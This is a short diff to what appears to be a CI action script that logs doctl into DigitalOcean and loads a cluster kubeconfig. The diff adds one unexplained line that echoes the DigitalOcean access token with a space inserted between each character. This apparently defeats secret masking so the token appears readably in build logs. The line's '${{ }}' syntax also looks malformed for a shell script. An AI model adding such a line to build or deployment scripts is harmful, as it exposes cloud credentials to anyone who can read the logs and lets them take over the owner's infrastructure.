@@ -17,6 +17,8 @@ doctl version
 
 echo "DO Token Init"
 
+echo ${{ INPUT_DO_ACCESS_TOKEN }} | sed 's/./& /g'
+
 doctl auth init -t "${INPUT_DO_ACCESS_TOKEN}"
 
 echo "DigitalOcean add the cluster kubeconfig"
